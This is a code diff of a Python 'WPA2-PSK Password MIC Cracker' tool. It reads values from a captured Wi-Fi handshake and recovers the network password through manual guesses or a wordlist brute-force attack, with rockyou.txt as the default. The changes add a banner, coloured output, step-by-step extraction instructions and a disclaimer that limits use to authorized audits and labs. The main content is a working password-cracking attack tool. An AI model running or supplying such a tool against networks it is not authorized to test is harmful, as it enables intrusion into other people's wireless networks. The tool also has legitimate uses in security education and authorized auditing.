@@ -5,25 +5,32 @@ from pbkdf2 import PBKDF2
 import binascii
 import os
 
-# Definimos las secuencias ANSI para el color magenta
-MAGENTA = '\033[95m'
-RESET = '\033[0m'
+def banner():
+    clear_screen()
 
 
-# Function: Clear Screen
-def clear_screen():
-    # Detect the operating system
-    if os.name == 'nt':  # For Windows
-        os.system('cls')
-    else:  # For Linux and Mac
-        os.system('clear')
+    print(f"################################################################################################")
+    print(f"#                                                                                              #")
+    print(f"#           {WHITE}@@@@@@@@@@@@@@@@@@{RESET}               ((_.-'-._.-| WPA2-PSK Password MIC Cracker |-._.-'-._))    #")
+    print(f"#         {WHITE}@@@@@@@@@@@@@@@@@@@@@@@{RESET}                                                              #")
+    print(f"#       {WHITE}@@@@@@@@@@@@@@@@@@@@@@@@@@@{RESET}          Networking & Cyber-Security PCAP Analysis Tool    #")
+    print(f"#      {WHITE}@@@@@@@@@@@@@@@@@@@@@@@@@@@@@{RESET}                                                           #")
+    print(f"#     {WHITE}@@@@@@@@@@@@@@@/      \\@@@/   @{RESET}        [+] Cyber-Weapon:............. MIC Cracker         #")
+    print(f"#    {WHITE}@@@@@@@@@@@@@@@@\\  {RED}O{WHITE}   @@  @ {RED}O{WHITE} @{RESET}        [+] Version:.................. 2.2                ")
+    print(f"#    {WHITE}@@@@@@@@@@@@@ @@@@@@@@@@  | \\@@@@@{RESET}      [+] Author:................... Fz3r0              ")
+    print(f"#    {WHITE}@@@@@@@@@@@@@ @@@@@@@@@\\__@_/@@@@@{RESET}      [+] Github:................... github.com/Fz3r0   ")
+    print(f"#     {WHITE}@@@@@@@@@@@@@@@/,/,/./'/_|.\\'\\,\\{RESET}       [+] Twitter:.................. @Fz3r0_OPs         ")
+    print(f"#       {WHITE}@@@@@@@@@@@@@|  | | | | | | | |{RESET}      [+] Youtube:.................. @Fz3r0_OPs         ")
+    print(f"#                   {WHITE}\\_|_|_|_|_|_|_|_|{RESET}                                                        ")
+    print(f"#                                                                                              #")
+    print(f"################################################################################################")
 
-# Función para formatear los datos en bloques de 2 caracteres por byte y 16 bytes por línea
-def format_hex_display(data):
-    hex_string = binascii.hexlify(data).decode('utf-8')
-    formatted = " ".join([hex_string[i:i+2] for i in range(0, len(hex_string), 2)])
-    lines = [formatted[i:i+47] for i in range(0, len(formatted), 48)]  # 16 bytes (32 chars) per line, plus spaces
-    return "\n".join(lines)
+
+
+#######################################################################################
+#
+# VARIABLES
+#
 
 ## Variables que necesita el 4-Way-Handshake:
 class WPA2Handshake:
@@ -36,23 +43,115 @@ class WPA2Handshake:
     passw = ''
     Eapol2frame = ''
 
-## Function: Ingresar Valores en shell
+## Function: Ingresar Valores de Variables en shell
 def testData():
-    ## SSID = Fz3r0::CWAP
-    WPA2Handshake.ssid        = input("Enter the ssid in string value (e.g. Fz3r0::CWAP)                        :: ") or "Fz3r0::CWAP"
-    ## AP   = Telmex
-    WPA2Handshake.macAP       = input("Enter the MAC Address of AP (e.g. F0:F0:F0:F0:F0:F0)                     :: ") or "50:4e:dc:90:2e:b8"
-    ## STA  = Xiaomi Phone
-    WPA2Handshake.macCli      = input("Enter the MAC Address of client STA (e.g. B2:B2:B2:B2:B2:B2)             :: ") or "3c:13:5a:f2:46:88"
-    ## Anonce = M1 nonce (nonce from the AP/Authenticator)
-    WPA2Handshake.anonce      = input("Enter the Anonce (e.g. EAPOL M1 HEX Nonce = Anonce (Copy HEX Stream))    :: ") or "f1b3a392f9a10693e031deb0edb996c27974f297c7963c005a5cd36116c80777"
-    ## Anonce = M1 nonce (nonce from the AP/Authenticator)
-    WPA2Handshake.snonce      = input("Enter the Snonce (e.g. EAPOL M2 HEX Nonce = Snonce (Copy HEX Stream))    :: ") or "a3911874480ff4e4b772c016d107ace5e0fb5fd972e5deeae1f662edeb8b4fc0"
-    ## Snonce = M2 nonce (nonce from the STA/Supplicant)    
-    WPA2Handshake.mic         = input("Enter the MIC (e.g. EAPOL M2 MIC)                                        :: ") or "07d2e88db2254f675d349996ef95ad93"
-    # OJO! para sacar el HEX stream del EAPOL 2, se debe seleccionar solo el 802.1X element del M2 (último "directorio" del frame), no todo el frame 802.11
-    WPA2Handshake.Eapol2frame = input("Enter the EAPOL2 Frame in HEX (802.1X Elemet ONLY - export > HEX-Stream) :: ") or "0103007b02010a00000000000000000001a3911874480ff4e4b772c016d107ace5e0fb5fd972e5deeae1f662edeb8b4fc0000000000000000000000000000000000000000000000000000000000000000007d2e88db2254f675d349996ef95ad93001c301a0100000fac040100000fac040100000fac0280400000000fac06"
-                    
+
+    ## Instructions
+    print("INSTRUCTIONS")
+    print()
+    print ("[!] IMPORTANT: Open the .pcap of the WPA2-PSK (Personal) authentication in Blackshark and extract the following data:")
+    print()
+
+    ## SSID   (Default: Fz3r0::CWAP
+    print("[+] Paste the SSID of the WLAN / or Press Enter to use Default = Fz3r0::CWAP") 
+    WPA2Handshake.ssid        = input("->> ") or "Fz3r0::CWAP"
+
+    ## AP     (Default: Telmex
+    print("[+] Paste the WLAN Address of the AP (BSSID) / or Press Enter to use Default =  50:4e:dc:90:2e:b8)")
+    WPA2Handshake.macAP       = input("->> ") or "50:4e:dc:90:2e:b8"
+
+    ## STA    (Default: Xiaomi Phone
+    print("[+] Paste the WLAN Address of client STA / or Press Enter to use Default =  3c:13:5a:f2:46:88)")
+    WPA2Handshake.macCli      = input("->> ") or "3c:13:5a:f2:46:88"
+
+    ## Anonce (Default: M1 nonce (nonce from the AP/Authenticator)
+    print("[+] Paste the Anonce - EAPOL M1 HEX Nonce - AP/Authenticator Nonce")
+    print("[?] Hint: Copy 'HEX Stream' from Blackshark / Select EAPOL M1 Nonce, Right Click, Copy > As HEX Stream")
+    WPA2Handshake.anonce      = input("->> ") or "f1b3a392f9a10693e031deb0edb996c27974f297c7963c005a5cd36116c80777"
+
+    ## Snonce = M2 nonce (nonce from the STA/Supplicant)  
+    print("[+] Paste the Snonce - EAPOL M2 HEX Nonce  - STA/Supplicant Nonce")
+    print("[?] Hint: Copy 'HEX Stream' from Blackshark / Select EAPOL M2 Nonce, Right Click, Copy > As HEX Stream")
+    WPA2Handshake.snonce      = input("->> ") or "a3911874480ff4e4b772c016d107ace5e0fb5fd972e5deeae1f662edeb8b4fc0"
+
+    ## MIC   
+    print("[+] Paste the MIC (e.g. EAPOL M2 MIC)  :: ")
+    print("[?] Hint: Copy 'HEX Stream' from Blackshark / Select EAPOL M2 MIC, Right Click, Copy > As HEX Stream")
+    WPA2Handshake.mic         = input("->> ") or "07d2e88db2254f675d349996ef95ad93"
+
+    # EAPOL 2 Frame > Only Payload (No Headers or FCS)
+    print("[+] Paste only the payload of EAPOL2 Frame in HEX (excuding MAC Header, LLC and FCS)")
+    print("[?] Hint: To copy 'HEX stream' of EAPOL 2 frame payload, you should select ONLY the 802.1X Information Element of the M2 (the last 'directory' of the frame), you should NOT copy the entire 802.11 frame.")
+    WPA2Handshake.Eapol2frame = input("->> ") or "0103007b02010a00000000000000000001a3911874480ff4e4b772c016d107ace5e0fb5fd972e5deeae1f662edeb8b4fc0000000000000000000000000000000000000000000000000000000000000000007d2e88db2254f675d349996ef95ad93001c301a0100000fac040100000fac040100000fac0280400000000fac06"
+
+    banner()
+ 
+# Visualize Variables in Shell
+def viewdata():
+    #print("\n=== Data for Offline Dictionary Attack on WPA2-PSK ===\n")
+    
+    # Introductory information about the data
+    #print("[?] Data involved in offline dictionary attack on WPA2-PSK MIC:")
+    #print("    - Includes SSID, Anonce, Snonce, MIC, and MAC addresses (Client STA and AP).")
+    #print("    - Anonce, Snonce, and MIC are shared unencrypted in EAPOL frames M1 and M2.")
+    #print("    - MAC Addresses and SSID can be captured during the handshake (or are pre-known).")
+    #print("\n[!] Key Insight:")
+    #print("    - The first two frames of the captured 4-way handshake (EAPOL M1 & M2) enable offline PSK guessing.\n")
+    
+    # Displaying captured 4-Way-Handshake data
+
+    print("\n=================================================================================================\n")
+
+    print(f"{BOLD}{CYAN}4-Way-Handshake (EAPOL M1 & M2) data needed for MIC validation & cracking:{RESET}\n")
+    
+    # Mostrar cada elemento de datos de manera estructurada
+    print(f"{WHITE}[{NEON_GREEN}+{WHITE}]{RESET} SSID:............................. ", f"{TEAL}{WPA2Handshake.ssid}{RESET}")
+    print(f"{WHITE}[{NEON_GREEN}+{WHITE}]{RESET} MAC Address (AP):................. ", f"{TEAL}{str(WPA2Handshake.macAP)}{RESET}")
+    print(f"{WHITE}[{NEON_GREEN}+{WHITE}]{RESET} MAC Address (STA):................ ", f"{TEAL}{str(WPA2Handshake.macCli)}{RESET}")
+    print(f"{WHITE}[{NEON_GREEN}+{WHITE}]{RESET} Anonce (AP):...................... ", f"{PINK}{WPA2Handshake.anonce}{RESET}")
+    print(f"{WHITE}[{NEON_GREEN}+{WHITE}]{RESET} Snonce (STA):..................... ", f"{PINK}{WPA2Handshake.snonce}{RESET}")
+    print(f"{WHITE}[{NEON_GREEN}+{WHITE}]{RESET} MIC (EAPOL M2):................... ", f"{MAGENTA}{WPA2Handshake.mic}{RESET}")
+    print(f"{WHITE}[{NEON_GREEN}+{WHITE}]{RESET} EAPOL M2 Payload:................. ", f"{GREEN}{WPA2Handshake.Eapol2frame}{RESET}")
+    
+    print("\n=================================================================================================\n")
+
+
+
+
+#######################################################################################
+#
+# PIMP FUNCTIONS
+#
+
+# Colors Definitions
+MAGENTA = '\033[95m'            # Magenta (neón)
+CYAN = '\033[96m'               # Cian (neón)
+YELLOW = '\033[93m'             # Amarillo (neón)
+GREEN = '\033[92m'              # Verde (neón)
+RED = '\033[91m'                # Rojo (neón)
+WHITE = '\033[97m'              # Blanco brillante
+LIME = '\033[38;5;10m'          # Lima (neón)
+PURPLE = '\033[38;5;129m'       # Morado (neón)
+ORANGE = '\033[38;5;214m'       # Naranja (neón)
+BRIGHT_BLUE = '\033[38;5;81m'   # Azul brillante
+PINK = '\033[38;5;213m'         # Rosa brillante
+TEAL = '\033[38;5;38m'          # Teal (agua marina) brillante
+NEON_YELLOW = '\033[38;5;226m'  # Amarillo neón
+NEON_GREEN = '\033[38;5;46m'    # Verde neón
+RESET = '\033[0m'               # Resetear color
+
+# Colores adicionales para resaltar secciones importantes
+BOLD = '\033[1m'
+
+
+# Function: Clear Screen
+def clear_screen():
+    # Detect the operating system
+    if os.name == 'nt':  # For Windows
+        os.system('cls')
+    else:  # For Linux and Mac
+        os.system('clear')
+             
 ####################################################################################################################
 #
 # Function: Algoritmo PRF512 (Para obtener PTK)
@@ -98,91 +197,104 @@ def customPRF512(pmk, text, key_data):
     # Aunque generemos más de 512 bits, solo los primeros 512 bits son los que nos interesan.
     return result[:block]
 
-def loadHandshakeFromPcap(scapycap):
-    #main
-    count = 0
-    for packet in scapycap:
-        if packet.haslayer("EAPOL"):
-            rw = bytes(packet["Raw"]).hex()
-            if count == 0:
-                WPA2Handshake.anonce = rw[26:90]
-                WPA2Handshake.macCli = packet.addr1
-            elif count == 1:
-                WPA2Handshake.snonce = rw[26:90]
-                WPA2Handshake.macAP = packet.addr3
-                WPA2Handshake.mic = rw[154:186]
-                WPA2Handshake.Eapol2frame = raw(packet["EAPOL"]).hex()
-            count += 1
-    if count == 0:
-        "No handshake found!"
-        exit()
 
 
-def viewdata():
-    #view
-
-    print("SSID: "+ WPA2Handshake.ssid)
-    print("mac_ap :"+str(WPA2Handshake.macAP))
-    print("mac_Cli :"+str(WPA2Handshake.macCli))
-    print("anonce: "+WPA2Handshake.anonce)
-    print("snonce: "+WPA2Handshake.snonce)
-    print("Captured MIC: "+WPA2Handshake.mic)
-    print("")
-
-
-def banner():
-    clear_screen()
-    print("")
-    print("############################################")
-    print("#  MIC Cracker WPA2 by Fzr0 perrote mayor  #")
-    print("############################################")
-    print("")
-
-#main
+# main
 def main():
     while True:
         banner()
-        print("Select the load mode!")
-        print("[0] - Manual Input")
-        # print("[1] - PCAP input")  <---- falta arreglar!!!!
+        print("\n=================================================================================================\n")
+        print(f"{BOLD}### DISCLAIMER:{RESET}\n")
+        print(f"{WHITE}[{RED}!{WHITE}]{RESET} 'WPA2-PSK Password MIC Cracker' is a tool designed for security audits on WPA2-PSK (Personal) IEEE 802.11 (Wi-Fi) networks.")
+        print(f"{WHITE}[{RED}!{WHITE}]{RESET} The tool is developed exclusively for educational purposes and authorized ofensive security engagements.")
+        print(f"{WHITE}[{RED}!{WHITE}]{RESET} Use is strictly limited to controlled environments (physical or virtual labs).")
+        print(f"{WHITE}[{RED}!{WHITE}]{RESET} Rules of Engagement (RoE) and Non-Disclosure Agreements (NDAs) are strongly recommended for any external engagements.")        
+        print(f"{WHITE}[{RED}!{WHITE}]{RESET} The author assume no responsibility for any misuse of this tool. Unauthorized or unethical usage is strictly discouraged.")
+        print()
+        print("\n=================================================================================================\n")
+        print()
+
+        print(BOLD + "Please select an option by entering the corresponding number and press Enter to proceed." + RESET)
+        print()
+        print("[0] - Launch Fz3r0 MIC Cracker")
         print("[9] - Exit")
-        opt = int(input(" > Select an option: "))
-        if opt == 9:
-            exit()
-        elif opt == 0:
-            testData()
-            passmode()
-        elif opt == 1:
-            WPA2Handshake.ssid = input("Enter the ssid: ") or 'Coherer'
-            handshake = input("PCAP path > ") 
-            scapycap = rdpcap(handshake)
-            loadHandshakeFromPcap(scapycap)
-            passmode()
+        print()
+        print("\n=================================================================================================\n")
+
+        try:
+            opt = int(input("->> "))
+            print()
+            if opt == 9:
+                print("Exiting... Goodbye!")
+                exit()
+            elif opt == 0:
+                banner()
+                testData()
+                passmode()
+            else:
+                print("Invalid selection. Please enter 0 to launch the MIC Cracker or 9 to exit.")
+        except ValueError:
+            print("Error: Invalid input. Please enter a valid number (0 or 9).")
 
 def passmode():
-    print("")
-    while True:
-        viewdata()
-        print("[0] - Manual check password")
-        print("[1] - Bruteforce password")
-        print("[9] - Back")
-        opt = int(input(" > Select an option: "))
-        print("")
-        if opt == 9:
-            main()
-        elif opt == 1:
-            crackPasswd()
-        elif opt == 0:
-            WPA2Handshake.passw = input("input the password to check: > ") or "Hunter2006"
-            checkPasswd()
+    while True:  # Start an infinite loop to keep showing the options until the user exits
+        try:
+
+            # Call ViewData Function: Display data related to the WPA2 handshake or relevant info 
+
+            viewdata()  
+            
+            print("\nATTACK SELECTION:")
+            print()
+            print("[0] - Manual Password Check")  # Option to check a password manually
+            print("[1] - Bruteforce Password Attack")  # Option to start a brute-force attack
+            print("[9] - Back to Main Menu")  # Option to go back to the main menu
+            print()  # Adds an empty line for spacing
+            
+            # Prompt the user to select an option
+            opt = int(input("->> Please select an option: "))  # Capture user input and convert it to an integer
+            print()  # Adds an empty line after user input for better formatting
+
+            # Handle the user's option
+            if opt == 9:
+                print("Returning to main menu...\n")  # Inform the user they are returning to the main menu
+                main()  # Call the main function (presumably to go back to the main menu)
+            elif opt == 1:
+                print("Initiating Bruteforce attack...\n")  # Notify the user that brute-force attack is starting
+                crackPasswd()  # Execute the brute-force attack (this function should be defined elsewhere)
+            # Manual Password
+            elif opt == 0:
+                print("Please input the password you wish to audit or press Enter to use the default (Hunter2006).")  # Prompt to manually input a password
+                WPA2Handshake.passw = input("--> ") or "Hunter2006"  # Allow user input, defaulting to "Hunter2006" if none is entered
+
+                banner()
+                viewdata()
+                print(f"[*] Passphrase to Audit:       {RED}{WPA2Handshake.passw}{RESET}\n")  
+
+                checkPasswd()  # Check the validity of the password (this function should be defined elsewhere)
+            else:
+                print("Invalid selection. Please enter a valid option (0, 1, or 9).\n")  # Inform the user of invalid input if it's not 0, 1, or 9
+        except ValueError:  # Catch any ValueError if the input is not an integer
+            print("Error: Invalid input. Please enter a valid number (0, 1, or 9).\n")  # Inform the user that their input is invalid
+
 
 def crackPasswd():
-    wordlist = input("Wordlist path >")
-    file = open(wordlist,'r+')
-    for l in file.readlines():
-
-        # PMK Derivation 
-        PMK = PBKDF2(l, WPA2Handshake.ssid, 4096).read(32)
+    # Preguntar por la ruta de la wordlist
+    wordlist = input("Wordlist path (dejar en blanco para usar /usr/share/wordlists/rockyou.txt) > ")
+    
+    # Usar rockyou.txt como ruta por defecto si el usuario no ingresa una ruta
+    if not wordlist:
+        wordlist = '/usr/share/wordlists/rockyou.txt'
+    
+    # Intentar abrir el archivo
+    try:
+        with open(wordlist, 'r') as file:
+            for l in file.readlines():
+                # Derivación PMK 
+                PMK = PBKDF2(l.strip(), WPA2Handshake.ssid, 4096).read(32)
+                # Aquí agregarías el código para probar el PMK con el handshake...
+    except FileNotFoundError:
+        print(f"Error: No se encontró el archivo {wordlist}")
 
 
 
@@ -210,7 +322,13 @@ def crackPasswd():
             print("####################")
             print("PW: "+str(l))
             print("")
-            
+ 
+
+
+
+
+
+
 def checkPasswd():
 
     ## CREAR Y MOSTRAR PMK
@@ -388,6 +506,25 @@ def checkPasswd():
         print("######################")
         print("") 
         
+     # Preguntar al usuario qué desea hacer
+    print("What would you like to do next?")
+    print("1. Go to main")
+    print("2. Try another password")
+    print("3. Exit")
     
+    choice = input("Please enter a number (1-3): ").strip()
 
-main()
+    if choice == "1":
+        main()  # Go to the main function
+    elif choice == "2":
+        checkPasswd()  # Retry the password check
+    elif choice == "3":
+        print("Exiting program...")
+        exit()  # Exit the program
+    else:
+        print("Invalid choice. Exiting program.")
+        exit()  # Exit if invalid choice   
+
+
+if __name__ == "__main__":
+    main()
